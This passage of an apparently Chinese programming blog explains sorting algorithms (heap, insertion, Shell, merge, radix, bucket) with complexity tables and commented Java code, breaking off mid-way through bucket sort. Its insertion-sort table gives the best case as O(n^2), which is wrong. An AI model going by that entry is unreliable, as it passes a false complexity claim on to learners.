class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 堆排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n     数组大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 排序后的数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] heapSort(<span class="type">int</span>[] array, <span class="type">int</span> n) &#123;</span><br><span class="line">    <span class="comment">// 构建最大堆（Max Heap）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        heapify(array, n, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从堆中提取元素，逐步将最大值放到数组末尾</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// 将堆顶元素（当前最大值）与数组末尾元素交换</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        array[<span class="number">0</span>] = array[i];</span><br><span class="line">        array[i] = temp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新构建堆，排除已排序部分</span></span><br><span class="line">        heapify(array, i, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建最大堆</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待构建堆的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n   数组大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> i   当前节点索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> n, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化最大值索引为当前节点索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">largest</span> <span class="operator">=</span> i;</span><br><span class="line">    <span class="comment">// 左子节点索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 右子节点索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果左子节点存在且大于当前节点，则更新最大值索引为左子节点</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; n &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果右子节点存在且大于当前节点，则更新最大值索引为右子节点</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; n &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果最大值索引不等于当前节点索引，则交换当前节点与最大值节点的值，并继续构建堆</span></span><br><span class="line">    <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        arr[i] = arr[largest];</span><br><span class="line">        arr[largest] = temp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归调用，对受影响的子树进行堆构建</span></span><br><span class="line">        heapify(arr, n, largest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="插入排序">插入排序</h2><h3 id="直接插入排序（Insertion-Sort）">直接插入排序（Insertion Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>插入排序将待排序的数组分成已排序和未排序两部分，初始时已排序部分只有一个元素（即数组的第一个元素），然后依次将未排序部分的元素插入到已排序部分的适当位置，直到全部元素都被插入到已排序部分，从而得到一个有序数组。</p><p><img src="https://oss.iuoyt.com/img/posts/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.gif" alt="插入排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 插入排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序的整数数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n   数组长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertionSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// 从第二个元素开始遍历数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="comment">// 将当前元素插入到已排序部分的适当位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 向右移动已排序部分中大于当前元素的元素，为当前元素腾出插入位置</span></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; key) &#123;</span><br><span class="line">            arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 插入当前元素到适当位置</span></span><br><span class="line">        arr[j + <span class="number">1</span>] = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="希尔排序（Shell-Sort）">希尔排序（Shell Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n^{1.3})$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>希尔排序是插入排序的一种改进版本，也称为缩小增量排序。它的基本思想是将待排序的数组按照一定的增量分割成若干个子序列，对每个子序列分别进行插入排序，随着增量逐渐减小，每个子序列包含的元素越来越多，当增量减小至1时，整个数组被分成了一个子序列，此时进行的插入排序就是对整个数组的排序。希尔排序的关键在于选择增量序列，常用的增量序列有希尔增量序列、Hibbard增量序列等。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.gif" alt="希尔排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 希尔排序</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n   数组的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// 初始增量设为数组长度的一半，逐渐减小增量直至1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> n / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// 对每个子序列进行插入排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> gap; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="comment">// 插入排序的过程，插入的间隔为当前增量gap</span></span><br><span class="line">            <span class="keyword">while</span> (j &gt;= gap &amp;&amp; arr[j - gap] &gt; key) &#123;</span><br><span class="line">                arr[j] = arr[j - gap];</span><br><span class="line">                j -= gap;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[j] = key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="更多排序算法">更多排序算法</h2><h3 id="归并排序（Merge-Sort）">归并排序（Merge Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>归并排序将待排序数组分成两个子数组，对每个子数组进行递归地归并排序，然后将已排序的子数组合并成一个有序数组。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.gif" alt="归并排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序的数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用辅助函数进行归并排序</span></span><br><span class="line">    mergeSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 辅助函数，对指定范围的数组进行归并排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr   待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> left  数组的起始索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> right 数组的结束索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="comment">// 计算中间位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 对左半部分进行归并排序</span></span><br><span class="line">        mergeSort(arr, left, mid);</span><br><span class="line">        <span class="comment">// 对右半部分进行归并排序</span></span><br><span class="line">        mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="comment">// 合并左右两部分</span></span><br><span class="line">        merge(arr, left, mid, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 辅助函数，合并两个已排序的子数组</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr   待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> left  左子数组的起始索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mid   左子数组的结束索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> right 右子数组的结束索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">    <span class="comment">// 计算左右两部分的长度</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> mid - left + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> right - mid;</span><br><span class="line">    <span class="comment">// 创建临时数组存放左右两部分的元素</span></span><br><span class="line">    <span class="type">int</span>[] leftPart = <span class="keyword">new</span> <span class="title class_">int</span>[n1];</span><br><span class="line">    <span class="type">int</span>[] rightPart = <span class="keyword">new</span> <span class="title class_">int</span>[n2];</span><br><span class="line">    <span class="comment">// 将元素拷贝到临时数组中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n1; ++i) &#123;</span><br><span class="line">        leftPart[i] = arr[left + i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n2; ++j) &#123;</span><br><span class="line">        rightPart[j] = arr[mid + <span class="number">1</span> + j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并两个子数组</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> left;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n1 &amp;&amp; j &lt; n2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (leftPart[i] &lt;= rightPart[j]) &#123;</span><br><span class="line">            arr[k] = leftPart[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr[k] = rightPart[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将剩余元素拷贝到数组中</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; n1) &#123;</span><br><span class="line">        arr[k] = leftPart[i];</span><br><span class="line">        i++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; n2) &#123;</span><br><span class="line">        arr[k] = rightPart[j];</span><br><span class="line">        j++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="基数排序（Radix-Sort）">基数排序（Radix Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>基数排序按照低位先排序，然后收集；再按照高位排序，然后再次收集；依次类推，直到最高位。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F.gif" alt="基数排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基数排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取数组中的最大值，用于确定排序的轮数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> getMax(arr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每一位进行计数排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="number">1</span>; max / exp &gt; <span class="number">0</span>; exp *= <span class="number">10</span>) &#123;</span><br><span class="line">        countingSort(arr, exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 辅助函数，获取数组中的最大值</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 数组中的最大值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getMax</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; max) &#123;</span><br><span class="line">            max = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 辅助函数，计数排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> exp 当前位数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">countingSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> exp)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">    <span class="type">int</span>[] output = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">    <span class="type">int</span>[] count = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 统计每个数字出现的次数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j : arr) &#123;</span><br><span class="line">        count[(j / exp) % <span class="number">10</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将计数数组转换为前缀和数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        count[i] += count[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从后往前遍历原数组，根据计数数组将元素放到正确的位置上</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        output[count[(arr[i] / exp) % <span class="number">10</span>] - <span class="number">1</span>] = arr[i];</span><br><span class="line">        count[(arr[i] / exp) % <span class="number">10</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将排好序的数组复制回原数组</span></span><br><span class="line">    System.arraycopy(output, <span class="number">0</span>, arr, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="桶排序（Bucket-Sort）">桶排序（Bucket Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>桶排序将待排序数组分割成若干个桶，然后对每个桶中的元素进行排序，最后按照顺序合并每个桶得到有序数组。</p><p><img src="https://oss.iuoyt.com/img/posts/%E6%A1%B6%E6%8E%92%E5%BA%8F.gif" alt="桶排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 桶排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n   数组长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bucketSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr == <span class="literal">null</span> || n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到最大值和最小值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>], min = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : arr) &#123;</span><br><span class="line">        max = Math.max(max, num);</span><br><span class="line">        min = Math.min(min, num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算桶的数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">bucketNum</span> <span class="operator">=</span> (max - min) / n + <span class="number">1</span>;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; buckets = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(bucketNum);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; i++) &#123;</span><br><span class="line">        buckets.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span 